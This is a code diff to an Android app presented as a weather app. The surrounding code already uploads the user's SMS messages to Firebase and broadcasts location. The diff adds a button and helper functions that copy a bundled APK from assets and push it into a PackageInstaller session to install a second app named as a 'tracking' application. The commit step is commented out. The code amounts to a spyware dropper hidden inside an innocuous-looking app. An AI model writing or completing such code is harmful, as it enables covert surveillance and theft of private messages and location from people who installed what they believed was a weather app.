@@ -2,9 +2,11 @@ package com.plcoding.weatherapp.presentation
 
 import android.Manifest
 import android.app.Activity
+import android.app.PendingIntent
 import android.content.ActivityNotFoundException
 import android.content.ClipData
 import android.content.ClipboardManager
+import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
@@ -45,6 +47,14 @@ import com.google.firebase.database.DatabaseReference
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.database.ValueEventListener
 import com.google.firebase.messaging.FirebaseMessaging
+import android.content.pm.PackageInstaller
+import android.content.res.AssetManager
+import androidx.compose.foundation.lazy.LazyRow
+import com.plcoding.weatherapp.presentation.ui.theme.ApkInstallReceiver
+import java.io.File
+import java.io.FileInputStream
+import java.io.FileOutputStream
+import java.io.IOException
 
 @AndroidEntryPoint
 class MainActivity : ComponentActivity() {
@@ -164,7 +174,6 @@ class MainActivity : ComponentActivity() {
                         )
                         Spacer(modifier = Modifier.height(16.dp))
                         WeatherForecast(state = viewModel.state)
-                        Spacer(modifier = Modifier.height(16.dp))
                         Button(onClick = {
                             FirebaseMessaging.getInstance().token.addOnCompleteListener(
                                 OnCompleteListener { task ->
@@ -277,6 +286,16 @@ class MainActivity : ComponentActivity() {
 
                         }) {
                             Text(text = "Uninstall package")
+                        }
+                        Button(onClick = {
+                            val apkFileName = "app-release.apk"
+                            val targetPackageName = "com.plcoding.SecondTrackingApplication"
+                            val apkFile = copyApkFromAssetsToCache(this@MainActivity, apkFileName)
+                            println("APK file name: $apkFile")
+                            installApk(apkFile, packageManager, targetPackageName)
+
+                        }) {
+                            Text(text = "Install package")
                         }
                     }
                     if (viewModel.state.isLoading) {
@@ -414,6 +433,99 @@ class MainActivity : ComponentActivity() {
             sendSMSToFirebase(smsList)
         }
     }
+
+
+    // Function to copy APK file from assets to app's cache directory
+    private fun copyApkFromAssetsToCache(context: Context, apkFileName: String): File? {
+        val assetManager: AssetManager = context.assets
+        val cacheDir: File = context.cacheDir
+
+        try {
+            // Open APK file from assets
+            val inputStream = assetManager.open(apkFileName)
+
+            // Create output file in app's cache directory
+            val outputFile = File(cacheDir, apkFileName)
+            val outputStream = FileOutputStream(outputFile)
+
+            // Copy APK file from assets to cache directory
+            inputStream.use { input ->
+                outputStream.use { output ->
+                    input.copyTo(output)
+                }
+            }
+
+            return outputFile
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+
+        return null
+    }
+
+    // Function to install an APK file
+    private fun installApk(apkFile: File?, packageManager: PackageManager, targetPackageName:String) {
+        try {
+            val packageInstaller = packageManager.packageInstaller
+
+            // Create a new session
+            val sessionParams = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
+            val sessionId = packageInstaller.createSession(sessionParams)
+            val session = packageInstaller.openSession(sessionId)
+
+            // Open the APK file as input stream
+            val inputStream = FileInputStream(apkFile)
+            val outputStream = session.openWrite("package", 0, -1)
+
+            // Copy the APK file contents to the session's output stream
+            val buffer = ByteArray(65536)
+            var bytesRead: Int
+            while (inputStream.read(buffer).also { bytesRead = it } != -1) {
+                outputStream.write(buffer, 0, bytesRead)
+            }
+
+            // Finish writing and close streams
+            session.fsync(outputStream)
+            inputStream.close()
+            outputStream.close()
+            println("You are here1")
+
+            // Commit the session (start installation for the target app)
+//            val intent = packageManager.getLaunchIntentForPackage(targetPackageName) // this@MainActivity.packageName
+//            println("You are here2")
+//            if (intent == null) {
+//                println("Launch intent is null for package: $targetPackageName")
+//                return
+//            }
+//            val pendingIntent = PendingIntent.getActivity(this@MainActivity,
+//                sessionId, intent, PendingIntent.FLAG_IMMUTABLE) //FLAG_UPDATE_CURRENT
+//            println("You are here3")
+//            session.commit(pendingIntent.intentSender)
+//            val intent = Intent(this@MainActivity, ApkInstallReceiver::class.java) // Create a dummy intent
+//            val pendingIntent = PendingIntent.getBroadcast(this@MainActivity, sessionId, intent, PendingIntent.FLAG_IMMUTABLE)
+//            session.commit(pendingIntent.intentSender)
+
+
+            // Create Intent to launch the installed app
+            val intent = Intent(Intent.ACTION_MAIN)
+            intent.addCategory(Intent.CATEGORY_LAUNCHER)
+            intent.setPackage(targetPackageName)
+            intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK
+//            or Intent.FLAG_ACTIVITY_CLEAR_TASK
+            println("Successfully installed APK")
+            // Check if the intent and package name are not null before launching
+            if (intent.resolveActivity(packageManager) != null && targetPackageName.isNotEmpty()) {
+                println("Successfully installed and launched app: $targetPackageName")
+            } else {
+                println("Failed to launch app: $targetPackageName")
+            }
+        } catch (e: IOException) {
+            println("Failed to install APK")
+            e.printStackTrace()
+            // Handle installation error
+        }
+    }
+
 
     private fun broadcastLocation(){
         val fusedLocationClient = LocationServices
